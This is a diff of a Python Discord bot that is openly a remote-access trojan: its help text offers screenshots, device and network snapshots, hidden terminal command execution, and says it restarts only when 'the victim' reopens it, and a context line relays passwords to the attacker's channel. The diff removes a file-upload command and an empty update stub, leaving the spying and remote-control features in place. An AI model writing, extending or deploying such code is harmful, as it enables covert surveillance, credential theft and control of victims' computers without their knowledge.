@@ -39,8 +39,6 @@ async def on_message(message:discord.Message):
 `!deviceinfo` or `!di` - Sends a snapshot of the device's info and details
 `!networkinfo` or `!ni` - Sends a snapshot of the device's network info and details
 `!cmd <command>` or `!c <command>` - Runs a command in the terminal (hidden)
-`!fileupload <filepath>` or `!fu <filepath>` - Sends a file
-`!update <?link>` or `!u <?link>` - Updates the script based on the web version
 `!exit` - Exits the program (warning: it can only start again if the victim reopens the script)""")
         
         if message.content in ['!screenshot', '!ss']:
@@ -82,12 +80,6 @@ Password: {}
             for msg in split:
                 await ctx.send("```"+msg+"```")
             await ctx.send("Complete")
-
-        if message.content.startswith(('!fileupload', '!fu')):
-            await ctx.send(file=" ".join(args))
-
-        if message.content.startswith(('!update', '!u')):
-            pass
 
         if message.content == "!exit":
             await ctx.send("Exitting")
